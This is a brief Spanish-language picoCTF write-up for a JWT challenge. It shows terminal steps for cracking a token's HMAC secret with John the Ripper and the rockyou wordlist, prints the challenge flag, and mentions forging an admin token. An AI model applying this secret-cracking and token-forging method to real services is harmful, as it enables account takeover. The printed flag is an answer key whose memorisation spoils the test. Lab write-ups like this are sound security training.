# JaWT Scratchpad
## Descripción

Check the admin scratchpad!

http://fickle-tempest.picoctf.net:55677
## Solución

```
┌──(flavio㉿kali)-[~/Escritorio]
└─$ nano hash                 
                                                                                                                                                                                                                                           
┌──(flavio㉿kali)-[~/Escritorio]
└─$ cat hash       
eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiZmxhdmlvIn0.V4RPEuXpyFU-lM1ZegQWmSfdO7j_X0UnTkLp6pbxOH0

┌──(flavio㉿kali)-[~/Escritorio]
└─$ sudo gzip -d /usr/share/wordlists/rockyou.txt.gz

┌──(flavio㉿kali)-[~/Escritorio]
└─$ john hash -w=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (HMAC-SHA256 [password is key, SHA256 256/256 AVX2 8x])
Will run 5 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status

ilovepico        (?)     

1g 0:00:00:00 DONE (2026-03-01 19:54) 1.204g/s 8919Kp/s 8919Kc/s 8919KC/s iloverob4live345..ilovekelsy1
Use the "--show" option to display all of the cracked passwords reliably
Session completed.


```

picoCTF{jawt_was_just_what_you_thought_bbb82bd4a57564aefb32d69dafb60583}
## Notas adicionales

Asemos uso de un debugger para verficar nuestro usuario admin.
## Referencias

https://en-wikipedia-org.translate.goog/wiki/JSON?_x_tr_sl=en&_x_tr_tl=es&_x_tr_hl=es&_x_tr_pto=tc

https://www.jwt.io/

https://github.com/openwall/john

https://jwt.tplant.com.au/